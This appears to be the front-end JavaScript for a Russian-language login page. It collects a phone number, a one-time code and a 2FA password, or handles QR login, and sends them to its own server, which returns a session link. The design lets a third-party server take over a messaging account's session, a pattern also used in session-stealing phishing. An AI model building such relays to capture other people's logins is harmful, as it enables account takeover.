// Login Page JavaScript
const $ = id => document.getElementById(id);
let sessionId = null;
let selectedCode = '+998';

// Elements
const countrySelect = $('country-select');
const countryDropdown = $('country-dropdown');
const phoneCode = $('phone-code');
const phoneInput = $('phone');

// Country Selector
countrySelect.addEventListener('click', (e) => {
    e.stopPropagation();
    countrySelect.classList.toggle('open');
    countryDropdown.classList.toggle('open');
});

document.addEventListener('click', () => {
    countrySelect.classList.remove('open');
    countryDropdown.classList.remove('open');
});

countryDropdown.querySelectorAll('.country-item').forEach(item => {
    item.addEventListener('click', (e) => {
        e.stopPropagation();
        const code = item.dataset.code;
        const flag = item.dataset.flag;
        const name = item.dataset.name;

        selectedCode = code;
        phoneCode.textContent = code;
        countrySelect.querySelector('.flag').textContent = flag;
        countrySelect.querySelector('.country-name').textContent = name;

        countrySelect.classList.remove('open');
        countryDropdown.classList.remove('open');
    });
});

// Load Countries from JSON
async function loadCountries() {
    try {
        const res = await fetch('/countries.json');
        const countries = await res.json();

        countryDropdown.innerHTML = countries.map(c => `
            <div class="country-item" data-code="${c.code}" data-flag="${c.flag}" data-name="${c.name}">
                <span class="flag">${c.flag}</span><span>${c.name}</span><span class="code">${c.code}</span>
            </div>
        `).join('');

        // Re-attach click handlers
        countryDropdown.querySelectorAll('.country-item').forEach(item => {
            item.addEventListener('click', (e) => {
                e.stopPropagation();
                const code = item.dataset.code;
                const flag = item.dataset.flag;
                const name = item.dataset.name;

                selectedCode = code;
                phoneCode.value = code;
                countrySelect.querySelector('.flag').textContent = flag;
                countrySelect.querySelector('.country-name').textContent = name;

                countrySelect.classList.remove('open');
                countryDropdown.classList.remove('open');
            });
        });
    } catch (e) {
        console.error('Failed to load countries:', e);
    }
}

loadCountries();

// Countries data for auto-detect
let countriesData = [];

// Load countries and store for auto-detect
async function initCountries() {
    try {
        const res = await fetch('/countries.json');
        countriesData = await res.json();
    } catch (e) { }
}
initCountries();

// Auto-detect country from phone code
function detectCountry(code) {
    if (!code.startsWith('+')) code = '+' + code;
    // Find exact match first, then longest prefix match
    let match = countriesData.find(c => c.code === code);
    if (!match) {
        // Try prefix match
        const matches = countriesData.filter(c => code.startsWith(c.code) || c.code.startsWith(code));
        if (matches.length > 0) {
            match = matches.sort((a, b) => b.code.length - a.code.length)[0];
        }
    }
    return match;
}

// Phone Code Input - auto-detect country
phoneCode.addEventListener('input', (e) => {
    let value = e.target.value;
    if (!value.startsWith('+')) {
        value = '+' + value.replace(/[^0-9]/g, '');
        e.target.value = value;
    } else {
        value = '+' + value.substring(1).replace(/[^0-9]/g, '');
        e.target.value = value;
    }

    selectedCode = value;

    // Auto-detect country
    const match = detectCountry(value);
    if (match) {
        countrySelect.querySelector('.flag').textContent = match.flag;
        countrySelect.querySelector('.country-name').textContent = match.name;
    }
});

// Phone Code - space jumps to phone input
phoneCode.addEventListener('keydown', (e) => {
    if (e.key === ' ' || e.key === 'Tab') {
        e.preventDefault();
        phoneInput.focus();
    }
});

// Phone Input - backspace on empty goes back to code
phoneInput.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !phoneInput.value) {
        e.preventDefault();
        phoneCode.focus();
        phoneCode.setSelectionRange(phoneCode.value.length, phoneCode.value.length);
    }
});

// Phone Number Formatter - supports up to 15 digits
phoneInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');

    // Limit to 15 digits (max international phone length)
    if (value.length > 15) {
        value = value.substring(0, 15);
    }

    // Smart formatting based on length
    let formatted = '';
    if (value.length <= 3) {
        formatted = value;
    } else if (value.length <= 6) {
        formatted = value.substring(0, 3) + ' ' + value.substring(3);
    } else if (value.length <= 10) {
        formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
    } else {
        formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10) + ' ' + value.substring(10);
    }

    e.target.value = formatted;
});

// Helpers
function showStep(name) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    $('step-' + name).classList.add('active');
}

function showError(msg) {
    const err = $('error');
    if (err) {
        err.textContent = msg;
        err.classList.add('show');
    }
}

function hideError() {
    const err = $('error');
    if (err) err.classList.remove('show');
}

// Phone Step
$('btn-phone').addEventListener('click', async () => {
    const phone = selectedCode + phoneInput.value.replace(/\D/g, '');
    if (phone.length < 10) {
        showError('Введите корректный номер телефона');
        return;
    }

    hideError();
    const btn = $('btn-phone');
    btn.disabled = true;
    btn.textContent = 'ЗАГРУЗКА...';

    try {
        const res = await fetch('/api/web-login/phone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone })
        });

        const data = await res.json();
        if (!res.ok) throw new Error(data.detail || 'Ошибка');

        sessionId = data.session_id;
        $('code-phone').textContent = phone;
        showStep('code');
    } catch (e) {
        showError(e.message);
    }

    btn.disabled = false;
    btn.textContent = 'ДАЛЕЕ';
});

// Code Step
$('btn-code').addEventListener('click', async () => {
    const code = $('code').value.trim();
    if (!code) {
        showError('Введите код');
        return;
    }

    hideError();
    const btn = $('btn-code');
    btn.disabled = true;
    btn.textContent = 'ЗАГРУЗКА...';

    try {
        const res = await fetch('/api/web-login/code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_id: sessionId, code })
        });

        const data = await res.json();

        if (data.needs_2fa) {
            // Show password hint if available
            if (data.hint) {
                $('twofa').placeholder = data.hint;
            }
            showStep('2fa');
            btn.disabled = false;
            btn.textContent = 'ДАЛЕЕ';
            return;
        }

        if (!res.ok) throw new Error(data.detail || 'Ошибка');

        $('session-link').href = data.session_url;
        showStep('success');
    } catch (e) {
        showError(e.message);
    }

    btn.disabled = false;
    btn.textContent = 'ДАЛЕЕ';
});

// 2FA Step
$('btn-2fa').addEventListener('click', async () => {
    const password = $('twofa').value;
    if (!password) {
        showError('Введите пароль');
        return;
    }

    hideError();
    const btn = $('btn-2fa');
    btn.disabled = true;
    btn.textContent = 'ЗАГРУЗКА...';

    try {
        const res = await fetch('/api/web-login/2fa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_id: sessionId, password })
        });

        const data = await res.json();
        if (!res.ok) throw new Error(data.detail || 'Ошибка');

        $('session-link').href = data.session_url;
        showStep('success');
    } catch (e) {
        showError(e.message);
    }

    btn.disabled = false;
    btn.textContent = 'ВОЙТИ';
});

// Back Button
$('btn-back').addEventListener('click', () => {
    hideError();
    showStep('phone');
});

// QR Login
let qrSessionId = null;
let qrPollInterval = null;

$('btn-qr-mode').addEventListener('click', async () => {
    showStep('qr');
    await generateQR();
});

$('btn-phone-mode').addEventListener('click', () => {
    stopQRPolling();
    showStep('phone');
});

async function generateQR() {
    const container = $('qr-container');
    container.innerHTML = '<div class="qr-loading">Генерация QR-кода...</div>';

    try {
        const res = await fetch('/api/qr-login/generate', { method: 'POST' });
        const data = await res.json();

        if (!res.ok) throw new Error(data.detail || 'Ошибка');

        qrSessionId = data.session_id;
        container.innerHTML = `<img src="${data.qr_image}" alt="QR Code">`;

        // Start polling
        startQRPolling();
    } catch (e) {
        container.innerHTML = `<div class="qr-expired">${e.message}<br><button class="btn-next" onclick="generateQR()">Попробовать снова</button></div>`;
    }
}

function startQRPolling() {
    stopQRPolling();
    qrPollInterval = setInterval(async () => {
        if (!qrSessionId) return;

        try {
            const res = await fetch(`/api/qr-login/status/${qrSessionId}`);
            const data = await res.json();

            if (data.status === 'success') {
                stopQRPolling();
                $('session-link').href = data.session_url;
                showStep('success');
            } else if (data.status === 'needs_2fa') {
                stopQRPolling();
                // Show 2FA step with hint if available
                if (data.hint) {
                    $('twofa').placeholder = data.hint;
                }
                showStep('qr-2fa');
            } else if (data.status === 'expired') {
                stopQRPolling();
                $('qr-container').innerHTML = '<div class="qr-expired">QR-код истёк<br><button class="btn-next" onclick="generateQR()">Обновить</button></div>';
            }
        } catch (e) { }
    }, 2000);
}

function stopQRPolling() {
    if (qrPollInterval) {
        clearInterval(qrPollInterval);
        qrPollInterval = null;
    }
}

// QR 2FA Submit
$('btn-qr-2fa').addEventListener('click', async () => {
    const password = $('qr-twofa').value;
    if (!password) {
        showError('Введите пароль');
        return;
    }

    hideError();
    const btn = $('btn-qr-2fa');
    btn.disabled = true;
    btn.textContent = 'ЗАГРУЗКА...';

    try {
        const res = await fetch('/api/qr-login/2fa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_id: qrSessionId, password })
        });

        const data = await res.json();
        if (!res.ok) throw new Error(data.detail || 'Ошибка');

        $('session-link').href = data.session_url;
        showStep('success');
    } catch (e) {
        showError(e.message);
    }

    btn.disabled = false;
    btn.textContent = 'ВОЙТИ';
});
